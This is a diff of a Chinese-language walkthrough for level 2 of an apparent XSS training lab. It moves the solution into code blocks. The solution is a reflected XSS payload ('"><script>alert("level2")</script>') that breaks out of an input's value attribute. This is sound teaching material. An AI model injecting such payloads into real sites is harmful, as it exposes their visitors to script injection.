@@ -8,8 +8,11 @@
 ok,顺利通关
 ## level2
 ![xss2](../_media/xss2.png)
-url为:
-https://xss.fbisb.com/yx/level2.php?keyword=test 
-keyword会回显到页面input的value属性，url改为
-https://xss.fbisb.com/yx/level2.php?keyword=%22%3E%3Cscript%3Ealert(%22level2%22)%3C/script%3E
+```code
+https://xss.fbisb.com/yx/level2.php?keyword=test
+```
+keyword会回显到页面input的value属性,url改为:  
+```code
+https://xss.fbisb.com/yx/level2.php?keyword="><script>alert("level2")</script>
+``` 
 闭合原有input标签，插入script脚本后通关
